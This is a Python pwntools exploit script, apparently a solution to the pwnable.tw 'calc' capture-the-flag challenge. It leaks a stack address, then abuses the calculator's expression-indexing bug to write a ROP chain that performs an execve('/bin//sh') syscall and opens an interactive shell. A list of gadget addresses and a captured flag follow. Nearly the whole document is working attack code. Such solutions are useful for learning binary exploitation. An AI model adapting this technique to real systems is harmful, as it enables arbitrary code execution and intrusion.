from pwn import *
import sys

if len(sys.argv) < 2:
	r = process('./calc')
else:
	host, port = "chall.pwnable.tw", 10100
	r = remote(host, port)
raw_input('debug')

def get_expr(string):
	r.sendline(string)

def send_str(index, offset, pheptoan):
	offset1 = offset
	offset2 = 0
	offset3 = 0
	string = "+" + str(index)
	if offset > 0x7fffffff:
		offset1 = 0x60000000
		offset2 = (offset - offset1)/2
		offset3 = offset - offset1 - offset2
		string += pheptoan + str(offset1)
		string += pheptoan + str(offset2)
		string += pheptoan + str(offset3)
	else:
		string += pheptoan + str(offset1)
	get_expr(string)

def offset_forward(offset):
	if offset > 0x7fffffff:
		offset1 = 0x60000000
		offset2 = (offset - offset1)/2
		offset3 = offset - offset1 - offset2
		return offset3
	else:
		return offset
		
def setup(index, offset_fd, num):
	pheptoan = ""
	if offset_fd > num:
		offset = offset_fd - num
		pheptoan = "-"
	else:
		offset = num - offset_fd
		pheptoan = "+"
	send_str(index, offset, pheptoan)
	return offset

r.recvuntil("calculator ===")
get_expr("-5")
r.recv(1)
res = r.recv(10)
address = int(res) + 2**32
log.info("buf_add = %#x" %address)

offset_num_string = 0x5c4
address_string = address + offset_num_string

#pop eax ; ret
num0 = 0x0805c34b
offset_fd = 0x8049499
offset0 = setup(361, offset_fd, num0)

#0xb
offset_fd = offset_forward(offset0)
num1 = 0xb
offset1 = setup(362, offset_fd, num1)

#pop ecx ; pop ebx ; ret
num2 = 0x080701d1
offset_fd = offset_forward(offset1)
offset2 = setup(363, offset_fd, num2)

#pop 0x0 to ecx
num3 = 0x0
offset_fd = offset_forward(offset2)
offset3 = setup(364, offset_fd, num3)

# pop string address to ebx
num4 = address_string
offset_fd = offset_forward(offset3)
offset4 = setup(365, offset_fd, num4)

#pop edx ; ret
num5 = 0x080701aa
offset_fd = offset_forward(offset4)
offset5 = setup(366, offset_fd, num5)

# pop 0x0 to edx
num6 = 0x0
offset_fd = offset_forward(offset5)
offset6 = setup(367, offset_fd, num6)

#int 0x80
num7 = 0x08049a21
offset_fd = offset_forward(offset6)
offset7 = setup(368, offset_fd, num7)

# chuoi "/bin"
bin_str = 0x6e69622f
offset_fd = offset_forward(offset7)
offset8 = setup(369, offset_fd, bin_str)

# chuoi "//sh"
sh_str = 0x68732f2f
offset_fd = offset_forward(offset8)
offset9 = setup(370, offset_fd, sh_str)

#chuoi 0x0
num14 = 0x0
offset_fd = offset_forward(offset9)
offset10 = setup(371, offset_fd, num14)

r.send("\n")
r.interactive()
r.close()
# 0x0807cc6c : add esp, 0x14 ; ret
# 0x0804da33 : add esp, 0x18 ; pop ebx ; ret
# 0x08049b87 : add esp, 0x1c ; ret
# 0x08049e57 : add esp, 0x2c ; ret
# 0x0809d710 : add esp, 0x3c ; ret
# 0x08049a21 : int 0x80
# 0x0809ec3a : pop eax ; pop ebx ; pop esi ; pop edi ; ret
# 0x0805c34b : pop eax ; ret
# 0x080481d1 : pop ebx ; ret
# 0x080701d1 : pop ecx ; pop ebx ; ret
# 0x080701aa : pop edx ; ret
# 0x080bc4f6 : pop esp ; ret
# 0x0805a01b : xor eax, eax ; add esp, 0x18 ; pop ebx ; ret

# stack : +

# FLAG{C:\Windows\System32\calc.exe}